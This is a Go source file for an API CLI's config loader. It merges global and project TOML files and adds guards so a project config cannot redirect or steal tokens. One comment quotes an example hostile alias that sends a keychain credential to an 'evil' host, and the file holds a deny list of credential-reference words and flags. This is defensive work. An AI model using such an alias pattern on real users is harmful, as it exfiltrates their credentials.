// Package config reads the optional TOML config: a global file and a
// project-local one, merged key by key (local wins).
//
//	~/.config/api/config.toml      global ($XDG_CONFIG_HOME, or $API_CONFIG)
//	<project>/.api.toml            local: nearest one walking up from the cwd
//
// The schema has no place for secrets (no token, no password), and unknown
// keys are rejected, so a credential cannot end up in a file that is meant to
// be committed. A profile can only NAME the variable that holds a token
// (token_env), never the token itself.
package config

import (
	"bytes"
	"errors"
	"fmt"
	"maps"
	"os"
	"path/filepath"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"time"

	"cybercat/api/internal/secretref"

	"github.com/pelletier/go-toml/v2"
)

// Defaults are the fallbacks for flags (flags > env vars > config > built-in).
type Defaults struct {
	Timeout        string `toml:"timeout,omitempty"`
	ConnectTimeout string `toml:"connect_timeout,omitempty"`
	Retry          *int   `toml:"retry,omitempty"`
	Color          string `toml:"color,omitempty"`
	Summary        *bool  `toml:"summary,omitempty"`
	// TokenCache and AutoLogin are honoured from the GLOBAL file only: they decide
	// whether a login token outlives the shell, which a cloned repo must not choose.
	TokenCache *bool `toml:"token_cache,omitempty"`
	AutoLogin  *bool `toml:"auto_login,omitempty"`
	// Editor is the command `api schema` opens items in. Global config only: it is
	// a program that gets run, which a cloned repo must not choose.
	Editor string `toml:"editor,omitempty"`
}

// Env is one named environment: [env.dev], [env.thien], ...
type Env struct {
	URL       string   `toml:"url,omitempty"`
	GraphQL   string   `toml:"graphql,omitempty"`
	Endpoints []string `toml:"endpoints,omitempty"`
	// EndpointPrefix is put in front of a bare endpoint name by `api schema`
	// ("v2/" makes "user" mean v2/user).
	EndpointPrefix string `toml:"endpoint_prefix,omitempty"`
	// OpenAPI is the PATH of this env's OpenAPI JSON document on its server, for
	// `api openapi sync` (when it is not at one of the usual places). A path, never
	// a URL: see ValidateOpenAPIPath.
	OpenAPI  string            `toml:"openapi,omitempty"`
	TokenEnv string            `toml:"token_env,omitempty"`
	Headers  map[string]string `toml:"headers,omitempty"`
	// Login describes how to log in to this env without typing anything. Like
	// token_env it is honoured only from the GLOBAL file: it names where your
	// credentials come from and where they are sent.
	Login *Login `toml:"login,omitempty"`
}

// anchored reports whether the env is tied to a server (url, login or
// token_env). Such a global env must not be redefined by a project file.
func (e Env) anchored() bool {
	return e.URL != "" || e.Login != nil || e.TokenEnv != ""
}

// Login is a login request, with credentials as value references.
type Login struct {
	Path      string            `toml:"path,omitempty"`       // REST: POST <path> with Vars as the JSON body
	GQL       string            `toml:"gql,omitempty"`        // GraphQL: the login mutation
	Endpoint  string            `toml:"endpoint,omitempty"`   // GraphQL: like api gql -e
	TokenPath string            `toml:"token_path,omitempty"` // jq path of the token in the response
	Vars      map[string]string `toml:"vars,omitempty"`       // body fields / GraphQL variables; dots nest

	// FromProject is set when the block came from a project .api.toml. Its
	// credentials must then be Keychain secrets bound to the server (see
	// secretstore.Secret.Origins): the file may come from a cloned repo.
	FromProject bool `toml:"-"`
}

// ValidateLogin is the part of login validation that must hold even while a
// block is half built (config set adds one field at a time): a malformed
// token_path, and the rule that a secret-looking variable must be a value
// reference, because a literal password has no place in a config file.
func ValidateLogin(l *Login) error {
	if l == nil {
		return nil
	}
	if l.TokenPath != "" && !strings.HasPrefix(l.TokenPath, ".") {
		return fmt.Errorf("login.token_path %q must be a jq path like .data.token", l.TokenPath)
	}
	for k, v := range l.Vars {
		if k == "" || strings.ContainsAny(k, "=\n") {
			return fmt.Errorf("login.vars: bad key %q", k)
		}
		if IsSecretKey(k) && !secretref.IsRef(v) {
			return fmt.Errorf("login.vars.%s looks like a secret but is a literal: use @keychain:NAME, @env:NAME or @prompt (see `api secret set`)", k)
		}
	}
	return nil
}

// Complete checks that a login block can be used: exactly one of path (REST)
// or gql (GraphQL). Checked when logging in, not on read, so an unfinished
// block never makes the rest of the config unusable.
func (l *Login) Complete() error {
	if (l.Path == "") == (l.GQL == "") {
		return fmt.Errorf("login needs exactly one of path (REST) or gql (GraphQL); finish it with `api config set env.<name>.login.path|gql ... --global`")
	}
	return nil
}

// Vars names the .env variables that hold this project's URLs, for projects
// that do not use API_BASE_URL / API_GRAPHQL_URL. URLs only: a project file
// must not be able to choose which variable becomes the token.
type Vars struct {
	BaseURL    string `toml:"base_url,omitempty"`
	GraphQLURL string `toml:"graphql_url,omitempty"`
	// EnvSuffix is the .env.<suffix> that `api env load` uses when you give no
	// name. A suffix, never a path: the loaded file is always .env.<suffix> in
	// the project root, so a project config cannot point `source` elsewhere.
	EnvSuffix string `toml:"env_suffix,omitempty"`
}

var envSuffixName = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9_.-]*$`)

// ValidateEnvSuffix accepts "" or a plain suffix (no slashes, no leading dot).
func ValidateEnvSuffix(s string) error {
	if s == "" || (envSuffixName.MatchString(s) && !strings.Contains(s, "..")) {
		return nil
	}
	return fmt.Errorf("env_suffix %q must be a plain suffix like dev or local (not a path)", s)
}

var endpointPrefix = regexp.MustCompile(`^[A-Za-z0-9_./-]*$`)

// ValidateEndpointPrefix accepts "" or a relative path prefix like v2/.
func ValidateEndpointPrefix(s string) error {
	if endpointPrefix.MatchString(s) && !strings.Contains(s, "..") && !strings.HasPrefix(s, "/") {
		return nil
	}
	return fmt.Errorf("endpoint_prefix %q must be a relative path prefix like v2/", s)
}

var openapiPath = regexp.MustCompile(`^/[A-Za-z0-9_./~%+@:,=?&-]*$`)

// ValidateOpenAPIPath accepts "" or an absolute PATH on the env's own server,
// like /openapi.json or /v3/api-docs/public?group=a. It must not be a URL or
// protocol-relative (//host/x): a config file can come from a cloned repo and
// must not choose which host `api openapi sync` fetches from.
func ValidateOpenAPIPath(s string) error {
	if s == "" {
		return nil
	}
	if len(s) <= 512 && openapiPath.MatchString(s) && !strings.HasPrefix(s, "//") && !strings.Contains(s, "..") {
		return nil
	}
	return fmt.Errorf("openapi %q must be a path on the server like /openapi.json (not a URL)", s)
}

var varName = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*$`)

// ValidateVarName accepts "" or a shell variable name.
func ValidateVarName(name string) error {
	if name == "" || varName.MatchString(name) {
		return nil
	}
	return fmt.Errorf("%q is not a variable name (letters, digits, underscore)", name)
}

// Config is the whole file.
type Config struct {
	Vars       Vars              `toml:"vars,omitempty"`
	DefaultEnv string            `toml:"default_env,omitempty"`
	Defaults   Defaults          `toml:"defaults,omitempty"`
	Env        map[string]Env    `toml:"env,omitempty"`
	Alias      map[string]string `toml:"alias,omitempty"`
}

// Loaded is the merged config plus where it came from.
type Loaded struct {
	Config
	GlobalPath string // "" when there is none
	LocalPath  string
	// Warnings are non-fatal notes about what was ignored for safety.
	Warnings []string
	// EnvOrigin says which file defines each env: "global", "project" or
	// "global + project". Display only (`api env status`); no rule reads it.
	EnvOrigin map[string]string
}

// GlobalPath is where the global file lives (it may not exist).
func GlobalPath() string { return GlobalPathWith(os.Getenv) }

// GlobalPathWith is GlobalPath with an injectable environment.
func GlobalPathWith(getenv func(string) string) string {
	if p := getenv("API_CONFIG"); p != "" {
		return p
	}
	dir := getenv("XDG_CONFIG_HOME")
	if dir == "" {
		home := getenv("HOME")
		if home == "" {
			var err error
			if home, err = os.UserHomeDir(); err != nil {
				return ""
			}
		}
		dir = filepath.Join(home, ".config")
	}
	return filepath.Join(dir, "api", "config.toml")
}

// FindLocal walks up from dir to the nearest .api.toml, or "" when none.
func FindLocal(dir string) string {
	for {
		p := filepath.Join(dir, ".api.toml")
		if st, err := os.Stat(p); err == nil && !st.IsDir() {
			return p
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			return ""
		}
		dir = parent
	}
}

// Read parses one file. A missing file is an empty config, not an error.
func Read(path string) (Config, error) {
	if path == "" {
		return Config{}, nil
	}
	data, err := os.ReadFile(path)
	if errors.Is(err, os.ErrNotExist) {
		return Config{}, nil
	}
	if err != nil {
		return Config{}, err
	}
	return ParseText(data, path)
}

// ParseText parses and validates config text; label names it in errors.
func ParseText(data []byte, path string) (Config, error) {
	var c Config
	dec := toml.NewDecoder(bytes.NewReader(data))
	dec.DisallowUnknownFields()
	if err := dec.Decode(&c); err != nil {
		var de *toml.DecodeError
		var se *toml.StrictMissingError
		switch {
		case errors.As(err, &se):
			// Name the keys only: the library's own text quotes the source line,
			// which would print a rejected secret value.
			var keys []string
			secret := false
			for _, e := range se.Errors {
				row, _ := e.Position()
				key := strings.Join(e.Key(), ".")
				keys = append(keys, fmt.Sprintf("%q (line %d)", key, row))
				secret = secret || IsSecretKey(key)
			}
			msg := fmt.Sprintf("%s: unknown key %s", path, strings.Join(keys, ", "))
			if secret {
				msg += ": secrets are not allowed in config"
			} else {
				msg += ": not a setting this version knows (default_env, [defaults], [vars], [env.<name>], [alias]); if it is a newer one, update the binary (make install)"
			}
			return Config{}, errors.New(msg)
		case errors.As(err, &de):
			row, col := de.Position()
			return Config{}, fmt.Errorf("%s:%d:%d: %s", path, row, col, de.Error())
		}
		return Config{}, fmt.Errorf("%s: %w", path, err)
	}
	for _, v := range []string{c.Vars.BaseURL, c.Vars.GraphQLURL} {
		if err := ValidateVarName(v); err != nil {
			return Config{}, fmt.Errorf("%s: [vars]: %w", path, err)
		}
	}
	if err := ValidateEnvSuffix(c.Vars.EnvSuffix); err != nil {
		return Config{}, fmt.Errorf("%s: [vars]: %w", path, err)
	}
	for name, e := range c.Env {
		for _, err := range []error{
			ValidateTokenEnv(e.TokenEnv),
			ValidateEndpointPrefix(e.EndpointPrefix),
			ValidateOpenAPIPath(e.OpenAPI),
			ValidateLogin(e.Login),
		} {
			if err != nil {
				return Config{}, fmt.Errorf("%s: env.%s: %w", path, name, err)
			}
		}
	}
	return c, nil
}

// tokenEnvName limits token_env to this tool's own variables. A config file can
// come from a cloned repo; without this it could name any secret in your
// environment and have it sent to the url next to it.
var tokenEnvName = regexp.MustCompile(`^API_TOKEN_[A-Z0-9_]+$`)

// ValidateTokenEnv accepts "" or a name like API_TOKEN_DEV.
func ValidateTokenEnv(name string) error {
	if name == "" || tokenEnvName.MatchString(name) {
		return nil
	}
	return fmt.Errorf("token_env %q must look like API_TOKEN_<NAME> (it only names a variable this tool reads)", name)
}

// Load reads the global and the local file (found from startDir) and merges
// them. An error in one file is returned together with whatever else loaded.
func Load(startDir string) (Loaded, error) { return LoadWith(startDir, os.Getenv) }

// LoadWith is Load with an injectable environment.
func LoadWith(startDir string, getenv func(string) string) (Loaded, error) {
	var l Loaded
	var errs []error

	gpath := GlobalPathWith(getenv)
	g, err := Read(gpath)
	if err != nil {
		errs = append(errs, err)
	} else if _, serr := os.Stat(gpath); serr == nil {
		l.GlobalPath = gpath
	}

	local := FindLocal(startDir)
	loc, err := Read(local)
	if err != nil {
		errs = append(errs, err)
	} else {
		l.LocalPath = local
	}

	// token_env decides which of YOUR variables is sent to an env's url, so a
	// project file (which may come from a cloned repo) must never set it, and
	// must never move the url of an env that has one: either would route your
	// real token to a server the repo chose.
	for name, pe := range loc.Env {
		ge, inGlobal := g.Env[name]
		// an env the global config already anchors to a server is not the
		// project's to redefine
		protected := inGlobal && ge.anchored()
		if pe.TokenEnv != "" {
			l.Warnings = append(l.Warnings, fmt.Sprintf("%s: env.%s.token_env ignored (token_env is only honoured in the global config)", local, name))
			pe.TokenEnv = ""
		}
		if pe.Login != nil {
			switch {
			case protected:
				l.Warnings = append(l.Warnings, fmt.Sprintf("%s: env.%s.login ignored (env %q is defined in your global config)", local, name, name))
				pe.Login = nil
			case loginUsesEnvRef(pe.Login):
				l.Warnings = append(l.Warnings, fmt.Sprintf("%s: env.%s.login ignored (a project login cannot use @env: references: they could read any variable of yours)", local, name))
				pe.Login = nil
			default:
				pe.Login.FromProject = true
			}
		}
		loc.Env[name] = pe
	}
	if loc.Defaults.TokenCache != nil || loc.Defaults.AutoLogin != nil || loc.Defaults.Editor != "" {
		l.Warnings = append(l.Warnings, fmt.Sprintf("%s: defaults.token_cache / auto_login / editor ignored (only honoured in the global config: they decide whether a token is kept after the shell closes, and which program is run)", local))
	}
	// A project alias runs with YOUR session when you type `api <alias>`: it must
	// not be able to name a credential reference or flags that widen where a token
	// goes (a cloned repo can ship `me = "login --gql -e https://evil ... @keychain:x"`).
	for name, cmd := range loc.Alias {
		if unsafeAlias(cmd) {
			l.Warnings = append(l.Warnings, fmt.Sprintf("%s: alias %q ignored (project aliases cannot use @keychain/@env/@prompt references or --trust-hosts, --token, --base, --har-secrets: put it in your global config if you mean it)", local, name))
			delete(loc.Alias, name)
		}
	}
	l.Config = Merge(g, loc)
	l.EnvOrigin = map[string]string{}
	for name := range g.Env {
		l.EnvOrigin[name] = "global"
	}
	for name := range loc.Env {
		if l.EnvOrigin[name] != "" {
			l.EnvOrigin[name] += " + project"
		} else {
			l.EnvOrigin[name] = "project"
		}
	}
	for name, pe := range loc.Env {
		ge, inGlobal := g.Env[name]
		protected := inGlobal && ge.anchored()
		moved := protected && ((pe.URL != "" && pe.URL != ge.URL) || (pe.GraphQL != "" && pe.GraphQL != ge.GraphQL))
		if moved && (l.Env[name].TokenEnv != "" || l.Env[name].Login != nil) {
			e := l.Env[name]
			e.TokenEnv, e.Login = "", nil
			l.Env[name] = e
			l.Warnings = append(l.Warnings, fmt.Sprintf("%s: env.%s changes the url of a global env: its token_env and login are dropped for this project", local, name))
		}
	}
	return l, errors.Join(errs...)
}

// Merge overlays over onto base: scalars by non-zero value, maps by key, and
// an env profile field by field.
func Merge(base, over Config) Config {
	out := base
	if over.DefaultEnv != "" {
		out.DefaultEnv = over.DefaultEnv
	}
	if over.Vars.BaseURL != "" {
		out.Vars.BaseURL = over.Vars.BaseURL
	}
	if over.Vars.GraphQLURL != "" {
		out.Vars.GraphQLURL = over.Vars.GraphQLURL
	}
	if over.Vars.EnvSuffix != "" {
		out.Vars.EnvSuffix = over.Vars.EnvSuffix
	}
	d := over.Defaults
	if d.Timeout != "" {
		out.Defaults.Timeout = d.Timeout
	}
	if d.ConnectTimeout != "" {
		out.Defaults.ConnectTimeout = d.ConnectTimeout
	}
	if d.Retry != nil {
		out.Defaults.Retry = d.Retry
	}
	if d.Color != "" {
		out.Defaults.Color = d.Color
	}
	if d.Summary != nil {
		out.Defaults.Summary = d.Summary
	}

	out.Env = map[string]Env{}
	maps.Copy(out.Env, base.Env)
	for k, v := range over.Env {
		e := out.Env[k]
		if v.URL != "" {
			e.URL = v.URL
		}
		if v.GraphQL != "" {
			e.GraphQL = v.GraphQL
		}
		if len(v.Endpoints) > 0 {
			e.Endpoints = v.Endpoints
		}
		if v.EndpointPrefix != "" {
			e.EndpointPrefix = v.EndpointPrefix
		}
		if v.OpenAPI != "" {
			e.OpenAPI = v.OpenAPI
		}
		if v.TokenEnv != "" {
			e.TokenEnv = v.TokenEnv
		}
		if v.Login != nil {
			e.Login = v.Login
		}
		if len(v.Headers) > 0 {
			h := map[string]string{}
			maps.Copy(h, e.Headers)
			maps.Copy(h, v.Headers)
			e.Headers = h
		}
		out.Env[k] = e
	}

	out.Alias = map[string]string{}
	maps.Copy(out.Alias, base.Alias)
	maps.Copy(out.Alias, over.Alias)
	return out
}

// Duration parses "30s" / "2m" or a bare number of seconds ("30").
func Duration(s string) (time.Duration, error) {
	s = strings.TrimSpace(s)
	if n, err := strconv.ParseFloat(s, 64); err == nil && n > 0 {
		return time.Duration(n * float64(time.Second)), nil
	}
	d, err := time.ParseDuration(s)
	if err != nil || d <= 0 {
		return 0, fmt.Errorf("bad duration %q: want seconds or e.g. 30s", s)
	}
	return d, nil
}

// EnvNames lists the configured env names, sorted.
func (c Config) EnvNames() []string {
	return slices.Sorted(maps.Keys(c.Env))
}

var unsafeAliasWords = []string{"@keychain:", "@env:", "@prompt", "--trust-hosts", "--token", "--base", "--har-secrets"}

// unsafeAlias reports whether an alias command line is not allowed in a project
// config (it is fine in the global one: that is yours).
func unsafeAlias(cmd string) bool {
	lower := strings.ToLower(cmd)
	for _, w := range unsafeAliasWords {
		if strings.Contains(lower, w) {
			return true
		}
	}
	return false
}

func loginUsesEnvRef(l *Login) bool {
	for _, v := range l.Vars {
		if k, _ := secretref.Parse(v); k == secretref.Env {
			return true
		}
	}
	return false
}
